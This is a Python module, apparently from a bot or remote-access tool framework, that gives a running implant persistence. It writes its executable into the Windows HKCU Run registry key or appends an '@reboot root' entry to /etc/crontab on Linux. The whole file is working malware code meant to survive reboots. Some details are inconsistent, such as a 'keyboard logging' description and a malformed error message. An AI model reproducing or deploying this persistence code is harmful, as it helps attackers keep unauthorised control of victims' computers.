from tasks.__task import Task


class MethodRegistry:
    platforms = ["win32"]
    administrator = {"win32": False}

    def __init__(self):
        super(MethodRegistry, self).__init__()

    def run(self):
        import os
        import sys
        import winreg

        key_val = r'Software\Microsoft\Windows\CurrentVersion\Run'

        key2change = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_val, 0, winreg.KEY_ALL_ACCESS)
        reg_value = os.path.realpath(sys.argv[0])

        winreg.SetValueEx(key2change, "Start", 0, winreg.REG_SZ, reg_value)
        return "Set persistence using registry method."


class MethodCrontab:
    platforms = ["linux"]
    administrator = {"linux": False}

    def __init__(self):
        super(MethodCrontab, self).__init__()

    def run(self):
        import sys
        job = "@reboot root {}".format(sys.executable)
        with open('/etc/crontab', 'r') as f:
            cron_file = f.read()
        if job not in cron_file:
            with open('/etc/crontab', 'a') as f:
                f.write('\n{}\n'.format(job))
        return "Set persistence using Crontab method."


class Persistence(Task):
    """Persistence task."""
    platforms = ["win32", "linux", "darwin"]
    description = "Logging keyboard actions."
    administrator = {"win32": False, "linux": False, "darwin": False}

    def __init__(self, task_id):
        super(Persistence, self).__init__(task_id)
        self.methods = [MethodRegistry, MethodCrontab]

    def run(self, **kwargs):
        import sys
        assert getattr(sys, 'frozen', False), "Package not frozen"

        from infos import administrator, platform
        failed = []
        admin = administrator()
        for method in self.methods:
            if any(x == platform() for x in method.platforms):
                if not admin and method.administrator.get(platform()):
                    continue
                try:
                    return method().run()
                except Exception as e:
                    failed.append("Method {} failed: {}".format(method.__name__, e))
        if failed:
            raise Exception("Could set persistence. All methods failed: {}".format(failed))
        else:
            raise Exception("No available persistence method for this bot. "
                            "Platform: {}. Admin rights: {}.".format(platform, admin))
